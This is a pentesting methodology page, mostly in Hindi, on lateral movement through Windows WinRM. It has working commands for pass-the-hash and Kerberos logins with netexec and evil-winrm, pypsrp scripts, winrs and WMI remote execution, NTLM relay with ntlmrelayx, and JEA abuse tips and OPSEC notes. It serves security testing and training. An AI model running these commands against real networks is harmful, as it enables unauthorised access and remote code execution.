# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM Windows environments में सबसे सुविधाजनक **lateral movement** transports में से एक है, क्योंकि यह आपको **WS-Man/HTTP(S)** पर remote shell देता है, बिना SMB service creation tricks की जरूरत के। अगर target **5985/5986** expose करता है और आपका principal remoting के लिए allowed है, तो आप अक्सर "valid creds" से "interactive shell" तक बहुत जल्दी पहुँच सकते हैं।

**protocol/service enumeration**, listeners, WinRM enabling, `Invoke-Command`, और generic client usage के लिए, देखें:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- **HTTP/HTTPS** का उपयोग करता है, SMB/RPC के बजाय, इसलिए यह अक्सर वहाँ काम करता है जहाँ PsExec-style execution block हो।
- **Kerberos** के साथ, यह reusable credentials target को भेजने से बचाता है।
- **Windows**, **Linux**, और **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) से साफ़ तरीके से काम करता है।
- Interactive PowerShell remoting path target पर authenticated user context के तहत **`wsmprovhost.exe`** spawn करता है, जो service-based exec से operationally अलग है।

## Access model and prerequisites

Practical रूप से, successful WinRM lateral movement **तीन** चीज़ों पर निर्भर करता है:

1. Target पर **WinRM listener** (`5985`/`5986`) और access allow करने वाले firewall rules हों।
2. Account endpoint पर **authenticate** कर सके।
3. Account को remoting session **open** करने की अनुमति हो।

यह access पाने के common तरीके:

- Target पर **Local Administrator** होना।
- Newer systems पर **Remote Management Users** membership, या ऐसे systems/components पर **WinRMRemoteWMIUsers__** membership जो अभी भी उस group को honor करते हैं।
- Local security descriptors / PowerShell remoting ACL changes के जरिए explicitly delegated remoting rights।

अगर आप पहले से admin rights के साथ कोई box control कर रहे हैं, तो याद रखें कि आप यहाँ बताई गई techniques का उपयोग करके **full admin group membership के बिना भी WinRM access delegate** कर सकते हैं:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos को hostname/FQDN चाहिए**। अगर आप IP से connect करते हैं, तो client आमतौर पर **NTLM/Negotiate** पर fall back करता है।
- **workgroup** या cross-trust edge cases में, NTLM के लिए अक्सर या तो **HTTPS** चाहिए होता है या client पर target को **TrustedHosts** में add करना पड़ता है।
- Workgroup में **local accounts** over Negotiate के साथ, UAC remote restrictions access रोक सकती हैं, जब तक built-in Administrator account उपयोग न किया जाए या `LocalAccountTokenFilterPolicy=1` न हो।
- PowerShell remoting default रूप से **`HTTP/<host>` SPN** का उपयोग करता है। ऐसे environments में जहाँ `HTTP/<host>` पहले से किसी और service account से registered है, WinRM Kerberos `0x80090322` के साथ fail हो सकता है; port-qualified SPN उपयोग करें या जहाँ वह SPN मौजूद हो वहाँ **`WSMAN/<host>`** पर switch करें।

अगर password spraying के दौरान आपको valid credentials मिलते हैं, तो उन्हें WinRM के जरिए validate करना अक्सर यह जांचने का सबसे तेज़ तरीका होता है कि वे shell में translate होते हैं या नहीं:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### इंटरैक्टिव shells के लिए Evil-WinRM

`evil-winrm` Linux से सबसे सुविधाजनक interactive option बना रहता है क्योंकि यह **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, file transfer, और in-memory PowerShell/.NET loading को support करता है।
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

जब डिफ़ॉल्ट **`HTTP/<host>`** SPN Kerberos failures का कारण बनता है, तो इसके बजाय **`WSMAN/<host>`** ticket request/use करने की कोशिश करें। यह hardened या odd enterprise setups में दिखता है, जहाँ **`HTTP/<host>`** पहले से किसी और service account से जुड़ा होता है।
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
यह **RBCD / S4U** abuse के बाद भी उपयोगी है, जब आपने विशेष रूप से एक सामान्य `HTTP` ticket के बजाय **WSMAN** service ticket forge या request किया हो।

### Certificate-based authentication

WinRM **client certificate authentication** को भी सपोर्ट करता है, लेकिन certificate को target पर एक **local account** से mapped होना चाहिए। Offensive perspective से यह तब महत्वपूर्ण होता है जब:

- आपने पहले से एक valid client certificate और private key चुरा ली/exports कर ली हो जो WinRM के लिए पहले से mapped हो;
- आपने **AD CS / Pass-the-Certificate** का abuse करके किसी principal के लिए certificate हासिल किया हो और फिर किसी दूसरे authentication path में pivot किया हो;
- आप ऐसे environments में operate कर रहे हों जो जानबूझकर password-based remoting से बचते हैं।
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM पासवर्ड/hash/Kerberos auth की तुलना में बहुत कम common है, लेकिन जब यह मौजूद हो, तो यह एक **passwordless lateral movement** path दे सकता है जो password rotation के बाद भी बना रहता है।

### Python / automation with `pypsrp`

अगर आपको operator shell की बजाय automation चाहिए, तो `pypsrp` Python से WinRM/PSRP देता है, जिसमें **NTLM**, **certificate auth**, **Kerberos**, और **CredSSP** support शामिल है।
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
यदि आपको उच्च-स्तरीय `Client` wrapper से अधिक बारीक नियंत्रण चाहिए, तो निम्न-स्तरीय `WSMan` + `RunspacePool` APIs दो सामान्य operator समस्याओं के लिए उपयोगी हैं:

- **`WSMAN`** को Kerberos service/SPN के रूप में force करना, बजाय उस default `HTTP` expectation के जिसे कई PowerShell clients उपयोग करते हैं;
- **non-default PSRP endpoint** से connect करना, जैसे **JEA** / custom session configuration, `Microsoft.PowerShell` के बजाय।
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Custom PSRP endpoints and JEA lateral movement के दौरान matter करते हैं

सफल WinRM authentication का मतलब **हमेशा** यह नहीं होता कि आप default unrestricted `Microsoft.PowerShell` endpoint पर पहुंचेंगे। Mature environments में **custom session configurations** या **JEA** endpoints हो सकते हैं, जिनकी अपनी ACLs और run-as behavior होती है।

अगर आपके पास पहले से किसी Windows host पर code execution है और आप समझना चाहते हैं कि कौन-कौन से remoting surfaces मौजूद हैं, तो registered endpoints enumerate करें:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
जब कोई useful endpoint मौजूद हो, तो default shell के बजाय उसे explicitly target करें:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
व्यावहारिक offensive implications:

- एक **restricted** endpoint lateral movement के लिए फिर भी पर्याप्त हो सकता है अगर वह service control, file access, process creation, या arbitrary .NET / external command execution के लिए सही cmdlets/functions expose करता है।
- एक **misconfigured JEA** role खास तौर पर valuable होता है जब वह dangerous commands जैसे `Start-Process`, broad wildcards, writable providers, या custom proxy functions expose करता है, जो आपको intended restrictions से बाहर निकलने देते हैं।
- **RunAs virtual accounts** या **gMSAs** द्वारा backed endpoints, आपके चलाए गए commands के effective security context को बदल देते हैं। खास तौर पर, gMSA-backed endpoint **second hop पर network identity** दे सकता है, even when एक normal WinRM session classic delegation problem में फँस जाए।

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` built in है और useful है जब आप **native WinRM command execution** चाहते हैं बिना interactive PowerShell remoting session खोले:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
दो flags को भूलना आसान है और practical में ये matter करते हैं:

- `/noprofile` अक्सर तब required होता है जब remote principal **local administrator** नहीं होता।
- `/allowdelegate` remote shell को आपकी credentials का उपयोग करके **third host** के against काम करने देता है (उदाहरण के लिए, जब command को `\\fileserver\share` की जरूरत हो)।
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operationally, `winrs.exe` आम तौर पर एक remote process chain में परिणत होता है, जो कुछ इस तरह होता है:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
यह याद रखने लायक है क्योंकि यह service-based exec और interactive PSRP sessions से अलग है।

### `winrm.cmd` / PowerShell remoting के बजाय WS-Man COM

आप **WinRM transport** के माध्यम से `Enter-PSSession` के बिना भी WS-Man पर WMI classes invoke करके execute कर सकते हैं। इससे transport WinRM ही रहता है, जबकि remote execution primitive **WMI `Win32_Process.Create`** बन जाता है:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
यह तरीका उपयोगी है जब:

- PowerShell logging की बहुत कड़ी निगरानी की जाती है।
- आप **WinRM transport** चाहते हैं लेकिन classic PS remoting workflow नहीं।
- आप **`WSMan.Automation`** COM object के आसपास custom tooling बना रहे हैं या उसका उपयोग कर रहे हैं।

## NTLM relay to WinRM (WS-Man)

जब SMB relay signing द्वारा block हो जाता है और LDAP relay constrained होता है, तब **WS-Man/WinRM** अभी भी एक आकर्षक relay target हो सकता है। Modern `ntlmrelayx.py` में **WinRM relay servers** शामिल हैं और यह **`wsman://`** या **`winrms://`** targets पर relay कर सकता है।
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
दो व्यावहारिक नोट्स:

- Relay सबसे उपयोगी होता है जब target **NTLM** स्वीकार करता है और relayed principal को WinRM उपयोग करने की अनुमति होती है।
- Recent Impacket code विशेष रूप से **`WSMANIDENTIFY: unauthenticated`** requests को handle करता है ताकि **`Test-WSMan`**-style probes relay flow को break न करें।

पहली WinRM session मिलने के बाद multi-hop constraints के लिए, देखें:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC और detection notes

- **Interactive PowerShell remoting** आमतौर पर target पर **`wsmprovhost.exe`** बनाता है।
- **`winrs.exe`** आमतौर पर **`winrshost.exe`** और फिर requested child process बनाता है।
- Custom **JEA** endpoints actions को **`WinRM_VA_*`** virtual accounts या configured **gMSA** के रूप में execute कर सकते हैं, जिससे normal user-context shell की तुलना में telemetry और second-hop behavior दोनों बदल जाते हैं।
- अगर आप raw `cmd.exe` की बजाय PSRP use करते हैं, तो **network logon** telemetry, WinRM service events, और PowerShell operational/script-block logging की उम्मीद करें।
- अगर आपको सिर्फ एक command चाहिए, तो `winrs.exe` या one-shot WinRM execution long-lived interactive remoting session की तुलना में quieter हो सकती है।
- अगर Kerberos उपलब्ध है, तो IP + NTLM की बजाय **FQDN + Kerberos** prefer करें ताकि trust issues और awkward client-side `TrustedHosts` changes दोनों कम हों।

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
